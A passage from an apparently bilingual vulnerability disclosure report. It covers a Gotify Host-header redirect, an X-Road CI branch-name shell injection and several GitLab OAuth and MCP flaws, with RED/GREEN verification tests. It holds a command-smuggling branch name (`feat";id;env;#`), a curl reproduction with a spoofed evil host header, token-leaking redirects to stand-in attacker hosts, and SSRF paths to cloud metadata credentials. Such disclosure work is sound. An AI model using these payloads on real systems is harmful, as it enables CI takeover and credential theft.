httpRouter.Use(func(ctx *gin.Context) {
    if ctx.Request.TLS == nil {
        // バグ: 攻撃者が自由に書き換え可能な ctx.Request.Host をそのままリダイレクト先に使っている！
        location := url.URL{
            Scheme:   "https",
            Host:     ctx.Request.Host,
            Path:     ctx.Request.URL.Path,
            RawQuery: ctx.Request.URL.RawQuery,
        }
        ctx.Redirect(http.StatusPermanentRedirect, location.String()) // 308 Permanent Redirect
        ctx.Abort()
    }
})
```
さらにステータスコードが `308 Permanent Redirect` であるため、HTTP メソッド（`POST` 等）とクエリ文字列（`?token=<app-token>`）およびリクエストボディを変更せずにそのまま攻撃者のサーバーへ再送信するようクライアントに指示してしまいます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — 自動監視・通知スクリプト（`curl -L` / Python `requests` / Uptime Kuma）からの `?token=` アプリケーショントークン窃取:**
  1. サーバー監視ツールや CI/CD 通知スクリプトが `http://gotify.internal/message?token=AgSecretToken123` に対してリダイレクト追従有効で POST リクエストを送っている。
  2. ネットワーク境界またはプロキシ経由で `Host: attacker-collector.example` が注入されると、Gotify は `308 Permanent Redirect` で `Location: https://attacker-collector.example/message?token=AgSecretToken123` を返す。
  3. クライアントが自動的にリダイレクト先へ POST を再送し、秘密のアプリケーショントークンと通知本文が攻撃者サーバーへそのまま渡される。
* **シナリオ B — 共有 HTTP キャッシュ / CDN / キャプティブポータルにおける `308` キャッシュポイズニングとフィッシング誘導:**
  1. 共有キャッシュやリバースプロキシの背後に置かれた Gotify に対し、攻撃者が `Host: fake-gotify-login.example` ヘッダー付きリクエストを送る。
  2. キャッシュされた `308 Permanent Redirect` により、後続の正規ユーザーのブラウザが永続的に偽のログイン画面へ転送される。
* **シナリオ C — ブラウザ永続リダイレクトキャッシュを利用した WebSocket / Web UI セッションの誘導:**
  1. ユーザーが一度でも悪意ある `Host` ヘッダーを伴うレスポンスを受け取ると、`308` がブラウザにキャッシュされ、次回以降のアクセスも攻撃者ホストへ向かう。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. ローカル隔離テスト環境での Host ヘッダーインジェクション再現コマンド例
curl -i "http://127.0.0.1:18080/message?token=secret-app-token" \
  -H "Host: evil-phish.example.com"

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_gotify_cand01 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "status_code": 308,
    "location": "https://evil-phish.example.com/message?token=secret-app-token",
    "redirected_to_untrusted_host": true
  },
  "GREEN": {
    "status_code": 308,
    "location": "https://push.corp.example/message?token=secret-app-token",
    "redirected_to_untrusted_host": false,
    "bound_to_configured_ssl_host": true
  }
}
```

---

### III.11 — Nordic Institute X-Road (`develop`) — 永続セルフホストランナー `xrd-runner-8c` 上で動作する `_build-and-package.yml` 内の `${{ github.head_ref }}` シェルコマンドインジェクション（`GHSA-4fcw-7xqx-fjv5`、`CWE-78`、CVSS `8.5 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `nordic-institute/X-Road`（GitHub Actions CI/CD パイプライン — `commit 38cd99ec0ebba0bd68a2581ca3c92be2e5f5843f`）
* **影響を受けるバージョン & コンポーネント:** `develop` ブランチ — `.github/workflows/build.yaml`（`1-55` 行）および `.github/workflows/_build-and-package.yml`（`Determine target branch` ステップ、`84-91` 行）
* **脆弱性分類 & スコア:** `CWE-78`（OS コマンドインジェクション）— **CVSS v3.1: `8.5 High`**（`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`）
* **GitHub GHSA リンク:** `GHSA-4fcw-7xqx-fjv5`（`https://github.com/nordic-institute/X-Road/security/advisories/GHSA-4fcw-7xqx-fjv5`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/ja/11-XROAD-CAND-01-RUNNER-INJECTION.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
GitHub Actions の YAML ファイル内で `${{ github.head_ref }}`（プルリクエストのブランチ名）を書くと、GitHub は **bash を起動する前の文字列置換としてその値をそのままスクリプト内に埋め込みます**。

X-Road のメインビルドワークフロー `build.yaml` は、`pull_request` イベントで発火し、**書き込み権限（`contents: write`, `packages: write`）と全シークレット継承（`secrets: inherit`）** を付けた状態で再利用ワークフロー `_build-and-package.yml` を呼び出します。そして `_build-and-package.yml` は **永続的なセルフホストランナー（`runs-on: xrd-runner-8c`）** 上で、最初のステップ（`actions/checkout` より前）として以下のスクリプトを実行します。
```yaml
# .github/workflows/_build-and-package.yml:84-91
jobs:
  build-packages:
    runs-on: xrd-runner-8c
    steps:
      - name: Determine target branch
        run: |
          if [ "${{ github.event_name }}" == "pull_request" ]; then
            echo "TARGET_BRANCH=${{ github.head_ref }}" >> "$GITHUB_ENV"
          else
            echo "TARGET_BRANCH=${{ github.ref_name }}" >> "$GITHUB_ENV"
          fi
```
Git のブランチ名には二重引用符（`"`）やセミコロン（`;`）を含めることができます。そのため、ブランチ名を `feat";id;env;#` にして PR を作成すると、展開後の bash スクリプトは `echo "TARGET_BRANCH=feat";id;env;#" >> "$GITHUB_ENV"` となり、**コードレビューが始まる前にセルフホストランナー上で任意の OS コマンドが実行** されます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — 細工されたブランチ名による PR 作成時のセルフホストランナー `xrd-runner-8c` 上での即時コマンド実行:**
  1. ブランチ作成権限を持つアカウントまたは侵害された開発者トークンから、`feat";<任意コマンド>;#` というブランチ名で PR が作成される。
  2. コードのチェックアウトやレビュアーの承認を待たずに、`Determine target branch` ステップで bash コマンドが即座に実行される。
* **シナリオ B — `secrets: inherit` と `packages: write` 権限を悪用した公式コンテナレジストリ（GHCR）・リポジトリ改ざん:**
  1. 親ワークフロー `build.yaml` が `permissions: contents: write, packages: write` と `secrets: inherit` を渡しているため、注入されたコマンドは書き込み権限を持つ `GITHUB_TOKEN` と継承された CI シークレットにアクセスできる。
  2. 攻撃者はこれらを用いて公式パッケージレジストリへ改ざんイメージをプッシュしたり、リポジトリのブランチやタグを書き換えたりできる。
* **シナリオ C — 永続セルフホストランナー（`xrd-runner-8c`）のキャッシュ汚染による後続の公式 X-Road パッケージへのバックドア混入:**
  1. GitHub ホストランナーと異なり、`xrd-runner-8c` はビルド間で環境が破棄されない永続セルフホストサーバーである。
  2. 攻撃者がランナー上のローカル Gradle キャッシュ、Docker レイヤーキャッシュ、またはバックグラウンドプロセスを汚染することで、後続の正規リリースビルドで生成される `.deb` / `.rpm` パッケージにバックドアを混入させる。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. _build-and-package.yml と build.yaml の該当行をソースコードで確認
sed -n '1,55p' /path/to/X-Road/.github/workflows/build.yaml
sed -n '80,95p' /path/to/X-Road/.github/workflows/_build-and-package.yml

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_xroad_cand01 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "runs_on": "xrd-runner-8c",
    "secrets_inherit": true,
    "direct_yaml_interpolation": true,
    "arbitrary_command_executed_on_self_hosted_runner": true
  },
  "GREEN": {
    "env_var_parameterized": true,
    "arbitrary_command_executed_on_self_hosted_runner": false
  },
  "BENIGN": {
    "target_branch_written": "feature/normal-branch"
  }
}
```

<!-- GITLAB-ADVISORIES-START -->

---

### III.12 — GitLab (`<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — OAuth 2.0 Device Authorization Grant (`Oauth::DeviceAuthorizationsController` & `Oauth::TokensController`) Policy Bypass of `disable_admin_oauth_scopes`, Email Confirmation Gate, and Organization Maintenance Mode (`GITLAB-CAND-02A / 02B / 02C`) (`CWE-863 / CWE-285`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE: gitlab-ce / gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `app/controllers/oauth/device_authorizations_controller.rb:4-50`, `app/controllers/oauth/tokens_controller.rb:42-75`
* **Vulnerability Class & Score:** `CWE-863 / CWE-285` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md`](advisories/ja/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Missing `verify_admin_allowed!` Bypasses Default `disable_admin_oauth_scopes` (`CAND-02A`, `device_authorizations_controller.rb:4-42`):** In `Oauth::AuthorizationsController` (`authorizations_controller.rb:18, 274-296`), `before_action :verify_admin_allowed!` blocks any untrusted OAuth application (`trusted: false`) from connecting to an administrator account with dangerous scopes (`api`, `read_api`, `admin_mode`, `sudo`, `write_repository`) whenever `Gitlab::CurrentSettings.disable_admin_oauth_scopes` is `true` (the default GitLab security setting). Because `Oauth::DeviceAuthorizationsController` inherits directly from `Doorkeeper::DeviceAuthorizationGrant::DeviceAuthorizationsController` without adding `before_action :verify_admin_allowed!`, any regular user can create an untrusted OAuth app (`trusted: false, device_code_enabled: true, scopes: 'api admin_mode'`) and obtain a full-privilege admin access token when an admin approves a `user_code` on `/oauth/device`.
2. **Step 2 — Missing `verify_confirmed_email!` Allows Unconfirmed Accounts to Mint Persistent OAuth Tokens (`CAND-02B`, `device_authorizations_controller.rb:4-42`):** GitLab allows newly registered or reconfirming users (`confirmed_at: nil`) an active web session within `allow_unconfirmed_access_for = 3.days` (`config/initializers/8_devise.rb:75, 103`), but `Oauth::AuthorizationsController` blocks them from minting OAuth tokens via `before_action :verify_confirmed_email!` (`403 Forbidden`). `Oauth::DeviceAuthorizationsController` omits `verify_confirmed_email!`, allowing unconfirmed accounts to mint persistent `access_token` and `refresh_token` credentials via `/oauth/device/authorize`.
3. **Step 3 — Missing `enforce_organization_maintenance_mode` and `device_code` Organization Lookup (`CAND-02C`, `tokens_controller.rb:42-70` & `device_authorizations_controller.rb:4-42`):** `Oauth::TokensController#organization_for_token_request` checks `refresh_token` and `authorization_code` grants against organization maintenance freezes (`migration` -> `503 Service Unavailable`, `legal` -> `403 Forbidden`), but omits `when 'urn:ietf:params:oauth:grant-type:device_code'`, while `Oauth::DeviceAuthorizationsController` omits both `set_current_organization` and `enforce_organization_maintenance_mode`.

```ruby
// File: app/controllers/oauth/device_authorizations_controller.rb (lines 4-35)
module Oauth
  class DeviceAuthorizationsController < Doorkeeper::DeviceAuthorizationGrant::DeviceAuthorizationsController
    include RequestPayloadLogger

    layout 'minimal'
    # BUG: Missing before_action :verify_confirmed_email!, :verify_admin_allowed!
    # BUG: Missing prepend_before_action :set_current_organization
    # BUG: Missing before_action :enforce_organization_maintenance_mode

// File: app/controllers/oauth/tokens_controller.rb (lines 42-52)
  def organization_for_token_request
    token_params = params.permit(:grant_type, :refresh_token, :code)
    case token_params[:grant_type]
    when 'refresh_token'
      OauthAccessToken.by_refresh_token(token_params[:refresh_token])&.organization
    when 'authorization_code'
      OauthAccessGrant.by_token(token_params[:code])&.organization
    # BUG: Missing when 'urn:ietf:params:oauth:grant-type:device_code'
    end
  end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Full GitLab Instance Admin Takeover via Untrusted Developer CLI/IDE Device Code Despite `disable_admin_oauth_scopes=true`:** On any standard GitLab instance (`disable_admin_oauth_scopes=true` by default to prevent untrusted OAuth apps from ever receiving `api` or `admin_mode` privileges), a regular user or external contractor registers an untrusted OAuth app (`trusted: false, device_code_enabled: true, scopes: "api admin_mode sudo"`) disguised as an internal CLI or VS Code helper and shares a login `user_code`. The moment an administrator approves the code on `/oauth/device`, GitLab bypasses `disable_admin_oauth_scopes` and mints a full-privilege `admin_mode` + `api` token. The attacker immediately uses this token to clone every private repository in the company, dump all CI/CD production secrets (`AWS_SECRET_ACCESS_KEY`, database passwords), create new root administrator accounts, and take complete control of the GitLab server.
* **Scenario B — Persistent API Backdoor & CI/CD Abuse Using Unverified / Spoofed Corporate Email Accounts (`confirmed_at: nil`):** An attacker signs up with an unverified or spoofed email address (`confirmed_at: nil`). While standard web OAuth (`/oauth/authorize`) blocks the account with `403 Forbidden (unconfirmed_email)`, the attacker completes `/oauth/device/authorize` + `/oauth/token` (`grant_type=urn:ietf:params:oauth:grant-type:device_code`) and mints persistent `access_token` and `refresh_token` credentials without ever verifying email ownership—retaining programmatic API access to internal/public repositories and CI pipelines even after the web session expires.
* **Scenario C — Injecting Backdoored Code & Malicious `.gitlab-ci.yml` Pipelines During an Enterprise Incident Freeze or Legal Hold (`migration` / `legal` Maintenance Mode):** During a live security incident investigation (`legal` hold -> `403`) or data-center migration (`migration` -> `503`), enterprise administrators lock the entire organization in maintenance mode so no code or state can be modified. Because `Oauth::TokensController` omits `device_code` from `organization_for_token_request`, an attacker exchanges a device code during the freeze window and pushes malicious commits (`POST /api/v4/projects/1/repository/commits` -> `201 Created`) or tampers with release branches while the organization is supposedly frozen.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect missing before_action guards in DeviceAuthorizationsController vs AuthorizationsController
grep -n -C 6 "verify_admin_allowed!" \
  /home/community-user/targets/gitlab/app/controllers/oauth/authorizations_controller.rb \
  /home/community-user/targets/gitlab/app/controllers/oauth/device_authorizations_controller.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report1_cand02
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-01_CAND-02A-02B-02C": {
    "GREEN": {
      "device_authorize_status": 503,
      "maintenance_mode_write_succeeded": false,
      "post_token_admin_action_succeeded": false,
      "redacted_token_sample": null,
      "standard_oauth_blocked": true,
      "token_exchange_status": 503,
      "token_minted_admin_mode": false
    },
    "RED": {
      "device_authorize_status": 200,
      "maintenance_mode_write_succeeded": true,
      "post_token_admin_action_succeeded": true,
      "redacted_token_sample": "[REDACTED_TEST_TOKEN_SHA256:91ba3cabf8cbd392]",
      "standard_oauth_blocked": true,
      "token_exchange_status": 200,
      "token_minted_admin_mode": true
    },
    "patches": {
      "GITLAB-CAND-02-COMBINED.patch": "33f6cf48a91be9d564f3964e9b9c7a4c6d412b6814ebfa71356102767bddc698",
      "GITLAB-CAND-02C-MAINTENANCE-MODE.patch": "80bfc7b3ee0e328487e4de303a9d707e575989f848d778914b359494fac90aa8"
    }
  }
}
```


---

### III.13 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — AI Catalog MCP OAuth `CallbackService`, `RefreshTokenService`, `RevokeTokenService`, and `DynamicRegistrationClient` `307 Temporary Redirect` / Unvalidated RFC 8414 Metadata SSRF & Error Body Reflection (`GITLAB-CAND-05`) (`CWE-918 / CWE-209`, CVSS `8.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/catalog/mcp_servers/callback_service.rb:17-50, 87-129`, `refresh_token_service.rb:18-70`, `dynamic_registration_client.rb:104-136`
* **Vulnerability Class & Score:** `CWE-918 / CWE-209` — **CVSS v3.1: `8.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md`](advisories/ja/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unvalidated RFC 8414 `token_endpoint`, `revocation_endpoint`, and `authorization_servers` (`dynamic_registration_client.rb:104-136`):** `DynamicRegistrationClient#discover_auth_server_url` and `#discover_metadata` validate only the initial discovery URL via `UrlBlocker`, but return `resource_metadata['authorization_servers'].first` and `response.parsed_response` (`token_endpoint`, `revocation_endpoint`, `issuer`) without running `Gitlab::HTTP_V2::UrlBlocker.validate!` on the discovered endpoints.
2. **Step 2 — `OAuth2::Client` (`oauth2 2.0.25`) Bypasses `Gitlab::HTTP` and Follows Up to 5 `307 Temporary Redirect` Hops (`callback_service.rb:38-50`, `refresh_token_service.rb:45-58`):** `CallbackService#build_oauth_client` and `RefreshTokenService#build_oauth_token` instantiate `OAuth2::Client.new` using Faraday's default `net_http` adapter (`max_redirects: 5`) without `UrlBlocker` or IP pinning. When an external OAuth server responds with `307 Temporary Redirect` to `http://127.0.0.1:...` or `http://169.254.169.254/latest/meta-data/...`, `OAuth2::Client` replays the full `POST` request (including `client_secret`, `code`, or `refresh_token`) directly against the internal target.
3. **Step 3 — Full Internal Error Body Reflection via `OAuth2::Error#message` (`callback_service.rb:24-25`, `refresh_token_service.rb:29-30`):** Both services rescue `OAuth2::Error => e` and pass `e.message` into `error(format(_('Failed to connect to MCP server: %{error}'), error: e.message))`, which `Oauth::McpConnectorsAuthController#callback` assigns to `flash[:alert]`, exposing raw internal HTTP `4xx`/`5xx` response bodies to the user.

```ruby
// File: ee/app/services/ai/catalog/mcp_servers/callback_service.rb (lines 15-50)
        def execute
          token_params = { redirect_uri: redirect_uri }
          token_params[:code_verifier] = code_verifier if code_verifier

          access_token = build_oauth_client.auth_code.get_token(code, **token_params)
          store_token(access_token)
        rescue OAuth2::Error, StandardError => e
          # BUG 1: Reflects raw upstream HTTP error response body (e.message) into flash[:alert]
          error(format(_('Failed to connect to MCP server: %{error}'), error: e.message))
        end
        ...
        def build_oauth_client
          auth_server_url = registration_service.discover_auth_server_url
          metadata = registration_service.discover_metadata(auth_server_url)
          # BUG 2: Uses OAuth2::Client (Faraday net_http, max_redirects: 5) without UrlBlocker or IP pinning!
          OAuth2::Client.new(
            mcp_server.oauth_client_id,
            mcp_server.oauth_client_secret,
            site: auth_server_url,
            authorize_url: metadata['authorization_endpoint'],
            token_url: metadata['token_endpoint'],
            auth_scheme: ::Gitlab::Oauth::DynamicRegistrationClient.token_endpoint_auth_scheme(metadata)
          )
        end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Stealing AWS/GCP Cloud IAM Credentials (`169.254.169.254`) and Internal Kubernetes/Vault Secrets Directly into the User's Browser (`flash[:alert]`):** An attacker registers an external MCP server whose OAuth `token_endpoint` responds with `307 Temporary Redirect` pointing to the cloud instance metadata service (`http://169.254.169.254/latest/meta-data/iam/security-credentials/...`) or an internal Kubernetes/Vault/Consul API (`http://127.0.0.1:8080/...`). `OAuth2::Client` follows the redirect from inside the GitLab server network and reflects the raw HTTP response body via `OAuth2::Error#message` straight into the user's browser `flash[:alert]` banner (`iam_role_credentials_exposed: true`), allowing the attacker to steal the GitLab host's cloud IAM role keys and compromise the underlying cloud infrastructure.
* **Scenario B — Executing Authenticated Internal `POST` Commands Against Firewalled Intranet Services (`127.0.0.1` / `10.x.x.x`) & Leaking OAuth Secrets:** Because `307 Temporary Redirect` preserves both the `POST` method and request body, an external OAuth endpoint redirects `CallbackService` and `RefreshTokenService` (`max_redirects: 5`) to firewalled internal microservices (`http://127.0.0.1:...`), triggering internal `POST` actions behind the firewall while leaking the MCP connector's `client_secret` and `refresh_token` (`canary_b_request_count = 5`).
* **Scenario C — Internal Intranet Port/Service Scanning & Basic-Auth Credential Exfiltration on Disconnect (`RevokeTokenService`):** When an administrator or developer clicks "Disconnect" on an MCP connector, `RevokeTokenService` sends an unvalidated `POST` request with HTTP Basic Auth (`client_id:client_secret`) to `metadata['revocation_endpoint']`, enabling internal network probing and credential theft.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect OAuth2::Client usage and OAuth2::Error reflection in CallbackService & RefreshTokenService
grep -n -C 12 "OAuth2::Client.new" \
  /home/community-user/targets/gitlab/ee/app/services/ai/catalog/mcp_servers/callback_service.rb \
  /home/community-user/targets/gitlab/ee/app/services/ai/catalog/mcp_servers/refresh_token_service.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report2_cand05
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-02_CAND-05-06-01": {
    "GREEN": {
      "bearer_token_leaked_to_canary": false,
      "canary_b_request_count": 0,
      "cross_org_server_mutated": false,
      "iam_role_credentials_exposed": false,
      "reflected_flash_contains_secret": false
    },
    "RED": {
      "bearer_token_leaked_to_canary": true,
      "canary_b_request_count": 2,
      "cross_org_server_mutated": true,
      "iam_role_credentials_exposed": true,
      "reflected_flash_contains_secret": true
    },
    "patches": {
      "GITLAB-CAND-01.patch": "77be0cfe3092c808ea8f0a1f33689c61de1c9db01155e950b1192f883984b689",
      "GITLAB-CAND-05.patch": "e63dce6d6b71fcb0fa357103078290e07d66a0c756607b7b35da9eae209b687e",
      "GITLAB-CAND-06-MCP-IDOR-CSRF.patch": "8bed587ca203bfcde8fcf8e4ec27b12038e4e5366dc33f3d285b742811d2632b"
    }
  }
}
```


---

### III.14 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — `Oauth::McpConnectorsAuthController`, `ConnectService`, and `Gitlab::Oauth::ClientState` Missing Organization Isolation (`in_organization`), Unauthorized DCR Client Overwrite, and Unbound OAuth State (`GITLAB-CAND-06`) (`CWE-639 / CWE-862`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/controllers/oauth/mcp_connectors_auth_controller.rb:16-78`, `ee/app/services/ai/catalog/mcp_servers/connect_service.rb:16-79`, `ee/lib/gitlab/oauth/client_state.rb:17-23`
* **Vulnerability Class & Score:** `CWE-639 / CWE-862` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md`](advisories/ja/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unscoped Global `Ai::Catalog::McpServer.find` Across Organizations (`mcp_connectors_auth_controller.rb:19, 38, 63, 71-73`):** `Oauth::McpConnectorsAuthController` checks `can?(current_user, :read_ai_catalog_mcp_server, Current.organization)` against the caller's own organization, and then calls `::Ai::Catalog::McpServer.find(mcp_server_params[:id])` without `.in_organization(Current.organization)`. Any user in Organization A can target an `McpServer` belonging to Organization B by ID.
2. **Step 2 — Unauthorized Dynamic Client Registration (DCR) Credential Mutation with Read-Only Permission (`connect_service.rb:16-39, 60-79`):** When `mcp_server.oauth_client_id.blank?` is true, `ConnectService#execute` calls `register_oauth_client`, which overwrites `mcp_server.update!(oauth_client_id: ..., oauth_client_secret: ...)` without verifying `Ability.allowed?(current_user, :update_ai_catalog_mcp_server, mcp_server)`.
3. **Step 3 — `Gitlab::Oauth::ClientState.from_state` Discards `data` Binding (`client_state.rb:17-23`) and `callback` Accepts Missing PKCE Verifiers:** `ClientState.from_state(state)` calls `new(salt: salt, token: token, return_to: return_to)` without passing `data:`, so `@data` defaults to `{}` and the HMAC check verifies only `return_to` without binding `user_id`, `organization_id`, or `mcp_server_id`.

```ruby
// File: ee/app/controllers/oauth/mcp_connectors_auth_controller.rb (lines 18-65)
    def connect
      mcp_server = ::Ai::Catalog::McpServer.find(mcp_server_params[:id]) # BUG 1: Missing .in_organization(Current.organization)
      result = ::Ai::Catalog::McpServers::ConnectService.new(
        mcp_server: mcp_server,
        redirect_uri: oauth_mcp_connectors_callback_url,
        return_to: mcp_server_params[:return_to] || root_path
      ).execute # BUG 2: Mutates oauth_client_id/secret without checking :update_ai_catalog_mcp_server!

// File: ee/lib/gitlab/oauth/client_state.rb (lines 19-23)
      def self.from_state(state)
        salt, token, return_to = state.to_s.split(':', 3)
        new(salt: salt, token: token, return_to: return_to) # BUG 3: Omits data: binding!
      end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Hijacking Another Organization's Enterprise AI / MCP Connector Across Tenant Boundaries (`Cross-Org IDOR`):** On a multi-organization GitLab deployment, an attacker in Organization A targets an `McpServer` ID belonging to Organization B via `POST /oauth/mcp_connectors/:id/connect`. Because `Oauth::McpConnectorsAuthController` omits `.in_organization(Current.organization)` and `ConnectService` omits `update_ai_catalog_mcp_server`, the attacker triggers Dynamic Client Registration (`register_oauth_client`) and overwrites Organization B's `oauth_client_id` and `oauth_client_secret` (`cross_org_server_mutated: true`)—redirecting the victim organization's AI connector OAuth flows and developer prompts/tokens to the attacker's OAuth client.
* **Scenario B — Read-Only Developer/Guest Overwrites Production AI Connector Credentials Within a Company:** A low-privileged user with only read permission (`read_ai_catalog_mcp_server`) invokes `/oauth/mcp_connectors/:id/connect` before or during connector setup and overwrites the server's `oauth_client_id` and `oauth_client_secret` without maintainer privileges (`update_ai_catalog_mcp_server`), hijacking or breaking the company's AI integration.
* **Scenario C — Cross-Session OAuth Account Binding (Login CSRF) via Unbound `ClientState` Token:** Because `ClientState.from_state` discards the `data` hash (`user_id` / `organization_id`) and `callback` makes PKCE `code_verifier` optional when absent from the session, an attacker tricks a victim developer into visiting a crafted `/oauth/mcp_connectors/callback?state=...&code=...` link, silently binding the victim's GitLab session to the attacker's external MCP account (`McpServerUserConnection`) so every AI tool call the victim makes streams workspace data to the attacker.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect unscoped McpServer.find in McpConnectorsAuthController and ConnectService
grep -n -C 8 "McpServer.find" \
  /home/community-user/targets/gitlab/ee/app/controllers/oauth/mcp_connectors_auth_controller.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report2_cand05
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-02_CAND-05-06-01": {
    "GREEN": {
      "bearer_token_leaked_to_canary": false,
      "canary_b_request_count": 0,
      "cross_org_server_mutated": false,
      "iam_role_credentials_exposed": false,
      "reflected_flash_contains_secret": false
    },
    "RED": {
      "bearer_token_leaked_to_canary": true,
      "canary_b_request_count": 2,
      "cross_org_server_mutated": true,
      "iam_role_credentials_exposed": true,
      "reflected_flash_contains_secret": true
    },
    "patches": {
      "GITLAB-CAND-01.patch": "77be0cfe3092c808ea8f0a1f33689c61de1c9db01155e950b1192f883984b689",
      "GITLAB-CAND-05.patch": "e63dce6d6b71fcb0fa357103078290e07d66a0c756607b7b35da9eae209b687e",
      "GITLAB-CAND-06-MCP-IDOR-CSRF.patch": "8bed587ca203bfcde8fcf8e4ec27b12038e4e5366dc33f3d285b742811d2632b"
    }
  }
}
```


---

### III.15 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — GitLab Workhorse DuoWorkflow External MCP Client Missing `transport.WithSSRFFilter()` and Cross-Origin Redirect `Authorization: Bearer` Token Leakage (`GITLAB-CAND-01`) (`CWE-918 / CWE-522`, CVSS `8.2 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`Go / GitLab Workhorse: gitlab.com/gitlab-org/gitlab/workhorse`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `workhorse/internal/ai_assist/duoworkflow/mcp.go:25-60, 101-112, 220-239`
* **Vulnerability Class & Score:** `CWE-918 / CWE-522` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md`](advisories/ja/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
